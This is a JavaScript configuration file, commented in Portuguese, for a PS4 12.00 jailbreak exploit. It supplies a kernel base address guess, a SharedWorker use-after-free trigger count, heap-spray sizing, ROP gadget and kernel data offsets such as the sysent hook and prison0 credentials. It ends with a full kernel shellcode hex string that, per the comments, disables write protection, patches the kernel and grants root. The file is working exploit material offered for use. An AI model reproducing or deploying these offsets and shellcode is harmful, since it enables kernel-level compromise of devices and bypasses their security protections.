/* ========================================================================
 * CONFIGURAÇÃO GLOBAL - PS4 12.00 JAILBREAK
 * Offsets extraídos de: 
 * 1. 1200_libkernel_sys.sprx.elf (Userland)
 * 2. Poops.java / KernelOffset.java (Kernel)
 * ======================================================================== */

// CONFIGURAÇÕES DE EXECUÇÃO
export const CONFIG = {
    // Endereço Base do Kernel (Chute "Golden" que funcionou nos testes)
    // Se der Panic, tente variar: 0x800000000n, 0x808000000n, etc.
    KERNEL_BASE_GUESS: 0x820000000n, 
    
    // Limite exato onde ocorre o Freeze/Panic (SharedWorker UAF)
    WORKER_LIMIT: 403,
    
    // Quantidade de objetos para o Heap Spray (Reclaim)
    // 15k a 20k é um bom número para garantir cobertura sem OOM
    SPRAY_QUANTITY: 20000
};

// GADGETS E OFFSETS (MAPA DE MEMÓRIA)
export const GADGETS = {
    // --- Userland (LibKernel SYS 12.00) ---
    pop_rdi:     0x2FEB5n,  // POP RDI; RET
    pop_rsi:     0x2B89Fn,  // POP RSI; RET
    pop_rax:     0x2C6E5n,  // POP RAX; RET
    sys_mmap:    0x7500n,   // Syscall 477 (mmap)
    sys_setuid:  0x4840n,   // Syscall 23 (setuid)

    // --- Kernel Code (Poops.java / Gezine) ---
    jmp_rsi:     0x47b31n,  // JMP QWORD PTR [RSI] (Gatilho de execução)
    kl_lock:     0xE6C20n,  // Kernel Lock (Novo! Ajuda na estabilidade)
    
    // --- Kernel Data (Poops.java) ---
    // Úteis se formos escrever um payload personalizado em JS
    sysent_hook: 0x110a760n, // Onde injetar o Kexec
    prison0:     0x111fa18n, // Credenciais (Root)
    rootvnode:   0x2136e90n, // Sistema de Arquivos
    evf_offset:  0x784798n   // Event Flag
};

// PAYLOAD (SHELLCODE 12.00 - GEZINE)
// Este binário já contém a lógica para usar os offsets acima internamente.
// Ele desativa WP, aplica patches e dá Root.
export const SHELLCODE_HEX = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";
